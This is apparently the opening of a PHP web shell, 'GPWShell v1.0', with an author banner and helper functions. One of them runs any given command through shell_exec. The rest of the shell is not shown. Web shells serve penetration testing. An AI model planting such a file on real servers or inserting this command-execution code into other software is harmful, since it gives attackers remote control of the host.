<!--                   
               _____ _       _ _ 
 ___ ___ _ _ _|   __| |_ ___| | |
| . | . | | | |__   |   | -_| | |
|_  |  _|_____|_____|_|_|___|_|_|
|___|_| Simple GUI PHP Web Shell  

GPWShell v1.0
Author: Carlos Padilla (cpadlab)
Proyect: https://github.com/cpadlab/GPWShell
-->

<?php

    function execCommand($command) {
        return shell_exec($command);
    }

    function reloadShell() {
        header("Location: {$_SERVER['PHP_SELF']}");exit();
    }

    function updateURLVar($vars) {
        return $_SERVER['PHP_SELF'] . '?' . http_build_query(array_merge($_GET, $vars));
    }
    
?>